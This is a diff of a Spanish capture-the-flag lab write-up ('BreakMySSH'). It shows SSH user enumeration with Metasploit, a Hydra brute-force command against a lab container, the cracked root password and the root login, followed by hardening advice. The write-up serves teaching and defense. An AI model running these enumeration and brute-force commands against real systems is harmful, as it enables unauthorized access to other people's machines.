@@ -23,7 +23,7 @@ Resultado relevante:
 ## 2) Enumeración de usuarios (Metasploit) 🔎
 Se usó el módulo auxiliar de Metasploit para enumerar usuarios SSH:
 
-- Módulo: auxiliary/scanner/ssh/ssh_enumusers
+- Módulo: `auxiliary/scanner/ssh/ssh_enumusers`
 - Uso en msfconsole:
 
 ```text
@@ -33,32 +33,36 @@ msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /ruta/a/rockyou.txt   #
 msf auxiliary(scanner/ssh/ssh_enumusers) > run
 ```
 
-Salida de ejemplo (véase imagen 1 y 2):
+Salida de ejemplo (véanse las imágenes 1 y 2):
 
 - Se listaron varios usuarios válidos, entre ellos `root`.
 
-![Imagen 1 - Resultado de ssh_enumusers](images/1.png)
+Imagen 1 — Resultado de `ssh_enumusers` (primer momento):
 
-![Imagen 2 - Resultado de ssh_enumusers (duplicado/otro momento)](images/2.png)
+![1 - Resultado de ssh_enumusers](images/1.png)
 
-Nota: Las imágenes están en la carpeta `images/` de esta máquina. Los nombres de archivo son 1.png, 2.png, 3.png, 4.png y corresponden a las capturas provistas.
+Imagen 2 — Resultado de `ssh_enumusers` (segunda captura):
+
+![2 - Resultado de ssh_enumusers (otro momento)](images/2.png)
+
+> Nota: Las imágenes están en la carpeta `laboratorios/BreakMySSH/images/` del repositorio.
 
 ---
 
 ## 3) Fuerza bruta con Hydra ⚔️
-Con el usuario `root` identificado, se ejecutó Hydra contra SSH usando un wordlist (p. ej. rockyou.txt):
+Con el usuario `root` identificado, se ejecutó Hydra contra SSH usando un wordlist (p. ej. `rockyou.txt`):
 
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 4
 ```
 
-Resultado (ejemplo):
+Resultado:
 
-- host: 172.17.0.3  login: root  password: estrella
+- host: `172.17.0.3`  login: `root`  password: `estrella`
 
-Captura (véase imagen 3):
+Captura (imagen 3):
 
-![Imagen 3 - Resultado de Hydra (password encontrado)](images/3.png)
+![3 - Resultado de Hydra (password encontrado)](images/3.png)
 
 ---
 
@@ -70,9 +74,9 @@ ssh root@172.17.0.3
 # password: estrella
 ```
 
-Salida (ejemplo) y verificación de ser root:
+Verificación de privilegios (imagen 4):
 
-![Imagen 4 - Sesión SSH como root](images/4.png)
+![4 - Sesión SSH como root](images/4.png)
 
 ---
 
@@ -81,7 +85,7 @@ Salida (ejemplo) y verificación de ser root:
 - Riesgo principal: enumeración de usuarios + contraseñas débiles → acceso root directo.
 
 Mitigaciones recomendadas:
-- Deshabilitar el login directo de `root` por SSH (PermitRootLogin no en `yes`).
+- Deshabilitar el login directo de `root` por SSH (`PermitRootLogin no`).
 - Forzar autenticación por clave pública (deshabilitar uso de passwords).
 - Aplicar políticas de contraseñas robustas y bloqueos ante intentos repetidos.
 - Filtrar/limitar acceso SSH por IP/VPN.
@@ -89,12 +93,10 @@ Mitigaciones recomendadas:
 ---
 
 ## Notas legales y de uso ⚠️
-Este ejercicio se realizó con fines educativos y en un entorno controlado. No ejecutes ataques contra sistemas sin autorización expresada del propietario.
+Este ejercicio se realizó con fines educativos y en un entorno controlado. No ejecutes ataques contra sistemas sin autorización expresa del propietario.
 
 ---
 
 ## Archivos relacionados 📁
-- Esta writeup está en: `laboratorios/BreakMySSH/breakmyssh.md`
+- Writeup: `laboratorios/BreakMySSH/breakmyssh.md`
 - Imágenes: `laboratorios/BreakMySSH/images/1.png` ... `4.png`
-
-Si quieres que suba también las imágenes (si me las proporcionas) puedo añadirlas en la carpeta `images/` y actualizar los enlaces automáticamente.
